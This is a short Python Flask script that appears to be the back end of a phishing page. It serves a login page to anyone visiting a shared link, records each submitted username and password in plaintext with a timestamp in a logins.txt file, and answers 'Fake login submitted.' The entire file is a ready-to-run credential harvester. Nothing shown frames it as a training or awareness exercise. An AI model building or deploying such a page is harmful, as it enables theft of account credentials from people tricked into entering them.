from flask import Flask, request, render_template
import datetime

app = Flask(__name__)

# This shows your index.html file when someone visits your link
@app.route('/')
def index():
    return render_template('index.html')

# This handles the login form submission
@app.route('/login', methods=['POST'])
def login():
    username = request.form.get('username')
    password = request.form.get('password')

    with open('logins.txt', 'a') as f:
        f.write(f"{datetime.datetime.now()}: {username} / {password}\n")

    return "Fake login submitted."

# This just starts the server — leave it at the bottom
if __name__ == '__main__':
    app.run()
